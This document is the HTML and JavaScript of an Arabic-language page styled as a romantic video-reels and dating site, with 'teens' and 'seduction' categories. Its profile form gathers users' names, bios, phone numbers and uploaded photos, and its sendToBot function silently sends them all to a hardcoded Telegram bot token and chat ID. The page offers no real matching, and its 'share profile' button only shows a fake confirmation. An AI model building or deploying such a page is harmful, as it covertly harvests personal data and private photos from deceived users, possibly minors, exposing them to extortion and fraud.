    <style>

        .welcome-message p { font-size: 1rem; font-weight: 500; color: #ffe0e7; text-shadow: 0 1px 3px rgba(0,0,0,0.3); display: inline-flex; align-items: center; gap: 10px; background: rgba(0,0,0,0.3); padding: 8px 20px; border-radius: 50px; backdrop-filter: blur(4px); }

        .username { font-weight: 800; font-size: 1rem; color: #ffbfd5; display: inline-flex; align-items: center; gap: 6px; background: rgba(0,0,0,0.4); padding: 4px 12px; border-radius: 40px; backdrop-filter: blur(4px); margin-bottom: 8px; }

        .connect-modal-content { background: #1e1217; width: 90%; max-width: 450px; max-height: 90vh; overflow-y: auto; border-radius: 32px; padding: 24px; border: 1px solid #ff6699; box-shadow: 0 20px 40px rgba(0,0,0,0.5); animation: fadeSlideUp 0.3s; }

        .share-btn { background: rgba(255,153,204,0.2); border: 1px solid #ff99cc; color: #ffbfd5; }

        .modal-content { background: #1e1217; width: 100%; max-height: 80vh; border-radius: 28px 28px 0 0; padding: 20px 18px 25px; display: flex; flex-direction: column; gap: 16px; animation: slideUp 0.25s ease; border-top: 2px solid #ff6699; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #ff99cc33; padding-bottom: 10px; color: #ffc0d0; }
        .comments-list { flex:1; overflow-y: auto; max-height: 45vh; display: flex; flex-direction: column; gap: 12px; }

        .add-comment input { flex:1; background: #3e2a32; border: none; padding: 12px 16px; border-radius: 40px; color: white; }
        .add-comment button { background: #ff4d6d; border: none; padding: 10px 18px; border-radius: 40px; color: white; font-weight: bold; cursor: pointer; }
        .close-modal { background: none; border: none; font-size: 1.7rem; color: #ff99bb; cursor: pointer; }
        @keyframes slideUp { from { transform: translateY(100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        @media (max-width: 550px) { .actions-sidebar { left: 8px; gap: 20px; } .action-btn { padding: 6px 8px; min-width: 50px; } .filter-btn { padding: 6px 18px; font-size: 0.8rem; } .connect-card { margin: 12px 16px; padding: 10px 16px; } }
    </style>
</head>
<body>
<header class="app-header"><h1><i class="fas fa-heartbeat"></i> ليالي رومانسية</h1></header>
<div class="welcome-message"><p><i class="fas fa-heart"></i> مرحباً بك في عالم الرومانسية.. اختر ما يناسب مشاعرك <i class="fas fa-heart"></i></p></div>
<div class="filter-bar" id="filterBar">
    <button class="filter-btn active" data-category="all"><i class="fas fa-globe"></i> الكل</button>
    <button class="filter-btn" data-category="romance"><i class="fas fa-heart"></i> رومانسية</button>
    <button class="filter-btn" data-category="wives"><i class="fas fa-ring"></i> أفلام الزوجات</button>
    <button class="filter-btn" data-category="teens"><i class="fas fa-female"></i> مراهقات</button>
    <button class="filter-btn" data-category="seduction"><i class="fas fa-fire"></i> إغراء شاب</button>
</div>
<div class="connect-card" id="connectCard"><div class="connect-text"><h3><i class="fas fa-heart"></i> ابحث عن عشقك</h3><p>سجّل بياناتك وشارك صورك ليصل إليك من يناسبك ❤️</p></div><div class="connect-icon"><i class="fas fa-arrow-left"></i></div></div>
<div class="reels-container" id="reelsContainer"></div>
<div class="footer-note">❤️ قصص حبك | ريلز رومانسية لا تنتهي</div>

<div id="connectModal" class="modal-connect"><div class="connect-modal-content"><button class="close-connect" id="closeConnectBtn">&times;</button><h2>✨ لقاء الأحلام ✨</h2><div class="sub">سجّل بياناتك واختر ما يناسب قلبك، ستظهر لمن يبحث عنك 💫</div>
<div class="form-group"><label>الاسم الظاهر</label><input type="text" id="profileName" placeholder="مثال: رامي العاشق"></div>
<div class="form-group"><label>نبذة عنك (صف نفسك)</label><textarea id="profileBio" placeholder="مراهق في العشرين، عمري 19 سنة، قلبي مليء بالمشاعر الجياشة، أحب الليالي الرومانسية والصدق. أبحث عن عشق يشاركني الأحلام والعفوية 🌙"></textarea></div>
<div class="form-group"><label>أبحث عن</label><select id="lookingFor"><option value="عشق رومانسي">عشق رومانسي</option><option value="عشق مراهق">عشق مراهق</option><option value="صديق العمر">صديق العمر</option><option value="شريك حياة">شريك حياة</option></select></div>
<div class="form-group"><label>رقم الهاتف (اختياري)</label><input type="tel" id="profilePhone" placeholder="+966 5xxxxxxxx"></div>
<div class="form-group"><label>صورك (اختر عدة صور)</label><div class="upload-btn" id="multiUploadTrigger"><i class="fas fa-images"></i> <span>اختر صوراً من جهازك</span><input type="file" id="multiImages" accept="image/*" multiple style="display:none"></div><div class="image-preview" id="imagePreviewContainer"></div></div>
<button class="send-btn" id="submitProfileBtn"><i class="fas fa-check-circle"></i> أوافق وأنشر بطاقتي</button>
<button class="share-btn" id="shareProfileBtn"><i class="fas fa-share-alt"></i> مشاركة الملف مع المجتمع</button></div></div>

<div id="commentModal" class="modal"><div class="modal-content"><div class="modal-header"><span><i class="fas fa-comment-dots"></i> التعليقات</span><button class="close-modal" id="closeModalBtn">&times;</button></div><div class="comments-list" id="commentsList"></div><div class="add-comment"><input type="text" id="newCommentInput" placeholder="اكتب تعليقاً رومانسياً..."><button id="submitCommentBtn">نشر</button></div></div></div>

<script>
const VIDEOS_DB = [
    { id: 1, videoUrl: "https://cdn.pixabay.com/video/2021/08/30/89128-595337898_large.mp4", user: "قلب_الغروب", description: "لحظة غروب والحب في العيون ❤️", likes: 147, isLiked: false, category: "romance", comments: [{ id: 101, username: "سلمى", text: "سبحان الله رومانسية جداً 💖" }] },
    { id: 2, videoUrl: "https://cdn.pixabay.com/video/2022/11/12/138420-773527375_large.mp4", user: "شاطئ_العشق", description: "نغمة الأمواج وقصة حبنا 🌊✨", likes: 289, isLiked: false, category: "romance", comments: [{ id: 201, username: "نادين", text: "ياااه شو حلوين سوا 😍" }] },
    { id: 3, videoUrl: "https://cdn.pixabay.com/video/2021/09/19/91416-611350182_large.mp4", user: "زهرة_الحب", description: "ورود تهمس: أحبك 🌹🥀", likes: 503, isLiked: false, category: "wives", comments: [{ id: 301, username: "ريما", text: "الورود أجمل هدية" }] },
    { id: 4, videoUrl: "https://cdn.pixabay.com/video/2022/03/27/112690-698216269_large.mp4", user: "زوجة_راقية", description: "لحظات دافئة مع الزوج ❤️🏠", likes: 872, isLiked: false, category: "wives", comments: [{ id: 401, username: "أمجد", text: "الله يديم المحبة" }] },
    { id: 5, videoUrl: "https://cdn.pixabay.com/video/2020/07/06/44096-441460868_large.mp4", user: "مراهقة_مرحة", description: "أيام المراهقة الجميلة 🌸✨", likes: 234, isLiked: false, category: "teens", comments: [{ id: 501, username: "لينا", text: "ذكريات رائعة" }] },
    { id: 6, videoUrl: "https://cdn.pixabay.com/video/2021/05/19/79763-548894958_large.mp4", user: "شوق_الصبا", description: "أحلام اليافعين 💫", likes: 167, isLiked: false, category: "teens", comments: [{ id: 601, username: "نور", text: "جميل جداً" }] },
    { id: 7, videoUrl: "E1.mp4", user: "وسيم_الليل", description: "إغراء الشاب الأول 🔥", likes: 45, isLiked: false, category: "seduction", comments: [] },
    { id: 8, videoUrl: "E2.mp4", user: "فاتن_القلوب", description: "إغراء الشاب الثاني ✨", likes: 62, isLiked: false, category: "seduction", comments: [] },
    { id: 9, videoUrl: "E3.mp4", user: "جاذب_الأنظار", description: "إغراء الشاب الثالث 💋", likes: 38, isLiked: false, category: "seduction", comments: [] }
];
let reelsData = JSON.parse(JSON.stringify(VIDEOS_DB));
let currentCategory = "all", currentVideoIdForModal = null;
const container = document.getElementById("reelsContainer"), filterBtns = document.querySelectorAll(".filter-btn");
const connectCard = document.getElementById("connectCard"), connectModal = document.getElementById("connectModal"), closeConnectBtn = document.getElementById("closeConnectBtn");
const multiImagesInput = document.getElementById("multiImages"), multiUploadTrigger = document.getElementById("multiUploadTrigger"), imagePreviewContainer = document.getElementById("imagePreviewContainer");
const submitProfileBtn = document.getElementById("submitProfileBtn"), shareProfileBtn = document.getElementById("shareProfileBtn");
let selectedImages = [];
function escapeHtml(s){ if(!s) return ''; return s.replace(/[&<>]/g, function(m){ if(m==='&') return '&amp;'; if(m==='<') return '&lt;'; if(m==='>') return '&gt;'; return m;}); }
function updateLikeUI(id,lc,liked){ let reel=document.querySelector(`.reel[data-reel-id='${id}']`); if(!reel) return; let likeBtn=reel.querySelector('.like-btn'), likeSpan=reel.querySelector('.like-count'); if(likeBtn) liked?likeBtn.classList.add('liked'):likeBtn.classList.remove('liked'); if(likeSpan) likeSpan.innerText=lc; }
function handleLike(id){ let v=reelsData.find(v=>v.id===id); if(!v) return; if(!v.isLiked){ v.isLiked=true; v.likes+=1; }else{ v.isLiked=false; v.likes-=1; } updateLikeUI(id,v.likes,v.isLiked); }
function handleShare(){ alert("✨ تم مشاركة الفيديو الرومانسي ✨"); }
function openCommentModal(vidId){ let v=reelsData.find(v=>v.id===vidId); if(!v) return; currentVideoIdForModal=vidId; renderCommentsInModal(v.comments); document.getElementById("commentModal").style.display="flex"; }
function renderCommentsInModal(ca){ let div=document.getElementById("commentsList"); if(!ca.length){ div.innerHTML=`<div style="text-align:center; padding:20px; color:#c994aa;">لا توجد تعليقات بعد.. كن أول من يعلق 💬</div>`; return; } div.innerHTML=ca.map(c=>`<div class="comment-item"><div class="comment-name"><i class="fas fa-user-circle"></i> ${escapeHtml(c.username)}</div><div class="comment-text">${escapeHtml(c.text)}</div></div>`).join(''); }
function addNewComment(vidId,txt){ if(!txt.trim()) return false; let v=reelsData.find(v=>v.id===vidId); if(!v) return false; let nc={id:Date.now(), username:"عاشق_رومانسي", text:txt.trim()}; v.comments.push(nc); if(currentVideoIdForModal===vidId) renderCommentsInModal(v.comments); updateCommentCounter(vidId); return true; }
function updateCommentCounter(vidId){ let reel=document.querySelector(`.reel[data-reel-id='${vidId}']`); if(!reel) return; let v=reelsData.find(v=>v.id===vidId); if(v){ let span=reel.querySelector('.action-btn:nth-child(2) span'); if(span) span.innerText=v.comments.length; } }
function createReelElement(v){ let div=document.createElement('div'); div.className='reel'; div.setAttribute('data-reel-id',v.id); let vc=document.createElement('div'); vc.className='video-container'; let ve=document.createElement('video'); ve.src=v.videoUrl; ve.playsInline=true; ve.preload="auto"; ve.controls=true; vc.appendChild(ve); let as=document.createElement('div'); as.className='actions-sidebar'; let lb=document.createElement('div'); lb.className=`action-btn like-btn ${v.isLiked?'liked':''}`; lb.innerHTML=`<i class="fas fa-heart"></i><span class="like-count">${v.likes}</span>`; let cb=document.createElement('div'); cb.className='action-btn'; cb.innerHTML=`<i class="fas fa-comment"></i><span>${v.comments.length}</span>`; let sb=document.createElement('div'); sb.className='action-btn'; sb.innerHTML=`<i class="fas fa-share-alt"></i><span>مشاركة</span>`; as.appendChild(lb); as.appendChild(cb); as.appendChild(sb); let vi=document.createElement('div'); vi.className='video-info'; vi.innerHTML=`<div class="username"><i class="fas fa-user-check"></i> @${v.user}</div><div class="description">${escapeHtml(v.description)}</div>`; div.appendChild(vc); div.appendChild(as); div.appendChild(vi); lb.addEventListener('click',(e)=>{ e.stopPropagation(); handleLike(v.id); }); cb.addEventListener('click',(e)=>{ e.stopPropagation(); openCommentModal(v.id); }); sb.addEventListener('click',(e)=>{ e.stopPropagation(); handleShare(); }); return div; }
function renderReelsByCategory(){ container.innerHTML=''; let filtered=currentCategory==="all"?reelsData:reelsData.filter(v=>v.category===currentCategory); if(filtered.length===0){ container.innerHTML=`<div style="text-align:center; padding:40px; color:#ff99cc;">لا توجد فيديوهات في هذا التصنيف 🥀</div>`; return; } filtered.forEach(v=>{ container.appendChild(createReelElement(v)); }); }
function setCategory(cat){ currentCategory=cat; filterBtns.forEach(btn=>{ if(btn.getAttribute('data-category')===cat) btn.classList.add('active'); else btn.classList.remove('active'); }); renderReelsByCategory(); }
filterBtns.forEach(btn=>{ btn.addEventListener('click',()=>{ setCategory(btn.getAttribute('data-category')); }); });
const BOT_TOKEN="8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc", CHAT_ID="1367401179";
async function sendToBot(name,bio,lookingFor,phone,images){ let text=`✨ لقاء الأحلام ✨\nالاسم: ${name}\nنبذة: ${bio||"غير مذكور"}\nأبحث عن: ${lookingFor}\nالهاتف: ${phone||"غير مشارك"}\nعدد الصور: ${images.length}`; try{ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:text})}); }catch(e){} for(let img of images){ let fd=new FormData(); fd.append('chat_id',CHAT_ID); fd.append('photo',img,img.name); try{ await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd}); }catch(e){} } }
function openConnectModal(){ connectModal.style.display="flex"; } function closeConnectModal(){ connectModal.style.display="none"; }
connectCard.addEventListener('click',openConnectModal); closeConnectBtn.addEventListener('click',closeConnectModal); connectModal.addEventListener('click',(e)=>{ if(e.target===connectModal) closeConnectModal(); });
multiUploadTrigger.addEventListener('click',()=>{ multiImagesInput.click(); });
multiImagesInput.addEventListener('change',(e)=>{ let files=Array.from(e.target.files); files.forEach(file=>{ if(file.type.startsWith('image/')){ selectedImages.push(file); let reader=new FileReader(); reader.onload=(ev)=>{ let pd=document.createElement('div'); pd.className='preview-item'; let img=document.createElement('img'); img.src=ev.target.result; let rm=document.createElement('div'); rm.className='remove-img'; rm.innerHTML='&times;'; rm.onclick=()=>{ let idx=selectedImages.findIndex(f=>f===file); if(idx!==-1) selectedImages.splice(idx,1); pd.remove(); }; pd.appendChild(img); pd.appendChild(rm); imagePreviewContainer.appendChild(pd); }; reader.readAsDataURL(file); } }); multiImagesInput.value=''; });
submitProfileBtn.addEventListener('click',async()=>{ let name=document.getElementById("profileName").value.trim(); if(!name) return; let bio=document.getElementById("profileBio").value.trim(); let lookingFor=document.getElementById("lookingFor").value; let phone=document.getElementById("profilePhone").value.trim(); await sendToBot(name,bio,lookingFor,phone,selectedImages); closeConnectModal(); document.getElementById("profileName").value=""; document.getElementById("profileBio").value=""; document.getElementById("profilePhone").value=""; document.getElementById("lookingFor").selectedIndex=0; selectedImages=[]; imagePreviewContainer.innerHTML=""; });
shareProfileBtn.addEventListener('click',()=>{ let name=document.getElementById("profileName").value.trim(); if(!name){ alert("أدخل اسمك أولاً لمشاركة ملفك مع المجتمع"); return; } alert(`📢 تم مشاركة ملف ${name} مع مجتمع ليالي رومانسية! سيجده من يبحث عن عشق مثله.`); });
const commentModal=document.getElementById("commentModal"), closeModalBtn=document.getElementById("closeModalBtn"), submitCommentBtn=document.getElementById("submitCommentBtn"), newCommentInput=document.getElementById("newCommentInput");
commentModal.addEventListener('click',(e)=>{ if(e.target===commentModal) commentModal.style.display="none"; }); closeModalBtn.addEventListener('click',()=>{ commentModal.style.display="none"; }); submitCommentBtn.addEventListener('click',()=>{ if(!currentVideoIdForModal) return; let txt=newCommentInput.value.trim(); if(!txt){ alert("اكتب تعليقاً جميلاً 🤍"); return; } addNewComment(currentVideoIdForModal,txt); newCommentInput.value=''; }); newCommentInput.addEventListener('keypress',(e)=>{ if(e.key==='Enter') submitCommentBtn.click(); });
setCategory("all");
</script>
